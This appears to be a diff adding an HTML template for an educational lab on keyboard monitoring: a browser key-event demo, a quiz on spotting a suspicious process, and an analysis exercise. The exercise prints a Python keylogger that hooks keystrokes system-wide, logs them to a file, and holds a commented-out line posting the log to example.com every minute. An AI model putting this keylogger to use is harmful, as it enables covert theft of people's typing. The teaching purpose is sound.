@@ -1,0 +1,240 @@
+{% extends "layout.html" %}
+
+{% block content %}
+<h1 class="mb-4">Interactive Educational Lab</h1>
+
+<div class="alert alert-info">
+    <h4>Educational Environment</h4>
+    <p>This interactive lab allows you to explore the concepts behind keyboard monitoring in a safe, controlled environment. All activities are confined to this browser page and do not affect your system.</p>
+</div>
+
+<div class="row mt-4">
+    <div class="col-lg-6 mb-4">
+        <div class="card h-100">
+            <div class="card-header">
+                <h3>Keyboard Event Demonstration</h3>
+            </div>
+            <div class="card-body">
+                <p>This demonstration shows how keyboard events can be captured in a web browser. Type in the field below to see events logged in real-time.</p>
+                <p class="text-muted">Note: This is a client-side demonstration using JavaScript. Actual keyloggers operate at the system level with much broader access.</p>
+                
+                <div class="form-group mt-3">
+                    <label for="demo-input" class="form-label">Type something:</label>
+                    <input type="text" class="form-control" id="demo-input" placeholder="Type here to see events">
+                </div>
+                
+                <div class="mt-3">
+                    <h5>Event Log:</h5>
+                    <div class="code-block" id="event-log" style="height: 200px; overflow-y: auto;">
+                        <p class="text-muted">Events will appear here as you type...</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="col-lg-6 mb-4">
+        <div class="card h-100">
+            <div class="card-header">
+                <h3>Detection Techniques Practice</h3>
+            </div>
+            <div class="card-body">
+                <p>This interactive exercise helps you learn to identify potential signs of keyboard monitoring software.</p>
+                
+                <div class="mt-3">
+                    <h5>Scenario:</h5>
+                    <p>You're investigating a Windows system that's behaving suspiciously. The user reports that the system seems slower than normal when typing.</p>
+                    
+                    <div class="code-block">
+                        <pre id="process-list">
+# Task Manager Process List
+explorer.exe        CPU: 0.2%    Memory: 42 MB
+chrome.exe          CPU: 4.5%    Memory: 215 MB
+svchost.exe         CPU: 0.1%    Memory: 12 MB
+winlogon.exe        CPU: 0.0%    Memory: 8 MB
+keyservice.exe      CPU: 1.2%    Memory: 24 MB
+conhost.exe         CPU: 0.0%    Memory: 4 MB
+taskmgr.exe         CPU: 0.3%    Memory: 18 MB
+
+# Startup Items
+Chrome              Publisher: Google LLC         Enabled
+OneDrive            Publisher: Microsoft Corp.    Enabled
+KeyService          Publisher: Unknown           Enabled
+
+# Network Connections
+chrome.exe          Local: 192.168.1.5:52631     Remote: 142.250.72.110:443
+keyservice.exe      Local: 192.168.1.5:51042     Remote: 18.44.133.86:8080
+explorer.exe        Local: 192.168.1.5:49822     Remote: 51.142.53.112:443
+                        </pre>
+                    </div>
+                    
+                    <div class="mt-3">
+                        <h5>Identify Suspicious Elements:</h5>
+                        <div class="form-check">
+                            <input class="form-check-input" type="checkbox" value="" id="check1">
+                            <label class="form-check-label" for="check1">
+                                Unknown publisher in startup items
+                            </label>
+                        </div>
+                        <div class="form-check">
+                            <input class="form-check-input" type="checkbox" value="" id="check2">
+                            <label class="form-check-label" for="check2">
+                                Suspicious process name "keyservice.exe"
+                            </label>
+                        </div>
+                        <div class="form-check">
+                            <input class="form-check-input" type="checkbox" value="" id="check3">
+                            <label class="form-check-label" for="check3">
+                                Unexpected network connection to unknown IP
+                            </label>
+                        </div>
+                        <div class="form-check">
+                            <input class="form-check-input" type="checkbox" value="" id="check4">
+                            <label class="form-check-label" for="check4">
+                                Process using CPU resources consistently
+                            </label>
+                        </div>
+                        
+                        <button id="check-answers" class="btn btn-primary mt-3">Check Answers</button>
+                        <div id="answer-feedback" class="alert mt-3 d-none"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="row mt-4">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header">
+                <h3>Code Analysis Exercise</h3>
+            </div>
+            <div class="card-body">
+                <p>Below is a simplified code snippet similar to what might be found in keyboard monitoring software. Analyze it to understand how it functions.</p>
+                
+                <div class="code-block">
+                    <pre class="language-python">
+import keyboard
+import time
+import requests
+
+class SimpleMonitor:
+    def __init__(self, log_file="keylog.txt"):
+        self.log_file = log_file
+        self.buffer = ""
+        self.last_send_time = time.time()
+        
+    def callback(self, event):
+        if event.event_type == 'down':
+            key = event.name
+            if len(key) == 1:  # Regular character
+                self.buffer += key
+            elif key == 'space':
+                self.buffer += ' '
+            elif key == 'enter':
+                self.buffer += '[ENTER]\n'
+            elif key == 'backspace':
+                self.buffer = self.buffer[:-1]  # Remove last character
+            
+            # Write to local file
+            with open(self.log_file, 'a') as f:
+                f.write(key)
+                
+            # Check if it's time to send data remotely
+            current_time = time.time()
+            if current_time - self.last_send_time > 60:  # Every minute
+                self.send_data()
+                self.last_send_time = current_time
+                
+    def send_data(self):
+        try:
+            # This would send data to a remote server
+            # requests.post('https://example.com/collect', data={'log': self.buffer})
+            self.buffer = ""  # Clear buffer after sending
+        except Exception as e:
+            pass  # Silently fail to avoid detection
+            
+    def start(self):
+        keyboard.hook(self.callback)
+        keyboard.wait()  # Keep program running
+
+# Usage
+# monitor = SimpleMonitor()
+# monitor.start()
+                    </pre>
+                </div>
+                
+                <div class="mt-4">
+                    <h5>Analysis Questions:</h5>
+                    <ol>
+                        <li>What are the primary functions of this code?</li>
+                        <li>What technique does it use to capture keystrokes?</li>
+                        <li>How does it attempt to avoid detection?</li>
+                        <li>What security measures could prevent this code from functioning?</li>
+                    </ol>
+                    
+                    <div class="accordion mt-3" id="codeAnalysisAccordion">
+                        <div class="accordion-item">
+                            <h2 class="accordion-header" id="headingOne">
+                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseOne" aria-expanded="false" aria-controls="collapseOne">
+                                    View Analysis
+                                </button>
+                            </h2>
+                            <div id="collapseOne" class="accordion-collapse collapse" aria-labelledby="headingOne" data-bs-parent="#codeAnalysisAccordion">
+                                <div class="accordion-body">
+                                    <ol>
+                                        <li><strong>Primary functions:</strong> The code captures keyboard input, logs it to a local file, and has functionality to periodically send the data to a remote server.</li>
+                                        <li><strong>Capture technique:</strong> It uses the keyboard library to hook into keyboard events at the system level and processes them based on event type.</li>
+                                        <li><strong>Avoidance of detection:</strong> It silently catches and ignores any exceptions during data transmission, preventing error messages that might alert users. It also uses a timeout mechanism to avoid constant network traffic.</li>
+                                        <li><strong>Preventive measures:</strong> Application whitelisting, monitoring for unusual Python processes, network traffic monitoring for unexpected connections, and keyboard access restrictions could help prevent this code from functioning effectively.</li>
+                                    </ol>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    // Keyboard event demonstration
+    const demoInput = document.getElementById('demo-input');
+    const eventLog = document.getElementById('event-log');
+    
+    demoInput.addEventListener('keydown', function(e) {
+        const logEntry = document.createElement('p');
+        logEntry.textContent = `Key Down: "${e.key}" (Key Code: ${e.keyCode})`;
+        eventLog.prepend(logEntry);
+    });
+    
+    // Detection exercise
+    const checkAnswersBtn = document.getElementById('check-answers');
+    const feedback = document.getElementById('answer-feedback');
+    
+    checkAnswersBtn.addEventListener('click', function() {
+        const check1 = document.getElementById('check1').checked;
+        const check2 = document.getElementById('check2').checked;
+        const check3 = document.getElementById('check3').checked;
+        const check4 = document.getElementById('check4').checked;
+        
+        if (check1 && check2 && check3 && check4) {
+            feedback.textContent = 'Correct! You identified all suspicious elements that could indicate keyboard monitoring software.';
+            feedback.classList.add('alert-success');
+            feedback.classList.remove('alert-danger', 'd-none');
+        } else if (check1 || check2 || check3 || check4) {
+            feedback.textContent = 'Partially correct. You identified some suspicious elements, but not all of them.';
+            feedback.classList.add('alert-warning');
+            feedback.classList.remove('alert-success', 'alert-danger', 'd-none');
+        } else {
+            feedback.textContent = 'Incorrect. Try again by looking for processes, connections, or startup items that seem unusual.';
+            feedback.classList.add('alert-danger');
+            feedback.classList.remove('alert-success', 'd-none');
+        }
+    });
+});
+</script>
+{% endblock %}
